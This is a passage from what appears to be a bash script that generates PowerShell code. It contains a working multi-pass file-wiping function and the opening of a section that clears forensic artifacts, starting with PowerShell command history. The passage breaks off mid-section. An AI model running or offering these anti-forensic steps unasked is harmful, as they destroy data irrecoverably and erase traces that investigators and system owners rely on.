# Secure file deletion — overwrite before delete
function Remove-Secure {
    param([string]$Path, [int]$Passes = 3)

    if (-not (Test-Path $Path)) {
        Write-Host "[-] Not found: $Path" -ForegroundColor Red
        return
    }

    $files = if ((Get-Item $Path) -is [IO.DirectoryInfo]) {
        Get-ChildItem $Path -Recurse -File -Force
    } else {
        @(Get-Item $Path -Force)
    }

    foreach ($f in $files) {
        try {
            $size = $f.Length
            for ($i = 0; $i -lt $Passes; $i++) {
                $bytes = New-Object byte[] $size
                (New-Object Random).NextBytes($bytes)
                [IO.File]::WriteAllBytes($f.FullName, $bytes)
            }
            # Zero pass
            [IO.File]::WriteAllBytes($f.FullName, (New-Object byte[] $size))
            Remove-Item $f.FullName -Force
            Write-Host "  [+] Wiped: $($f.FullName) ($Passes passes)" -ForegroundColor Green
        } catch {
            Write-Host "  [-] Failed: $($f.FullName) — $_" -ForegroundColor Red
        }
    }

    # Remove empty directories
    if ((Get-Item $Path -ErrorAction SilentlyContinue) -is [IO.DirectoryInfo]) {
        Remove-Item $Path -Recurse -Force -ErrorAction SilentlyContinue
    }
}

$target = Read-Host "File/directory to securely delete"
if ($target) { Remove-Secure -Path $target }
PSEOF
    fi

    if [[ "$CS" == "2" || "$CS" == "3" ]]; then
        cat >> "$OUTFILE" << 'PSEOF'

# Clear forensic artifacts
Write-Host "`n[*] Clearing forensic artifacts..." -ForegroundColor Yellow

# PowerShell history
$histPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
if ($histPath -and (Test-Path $histPath)) {
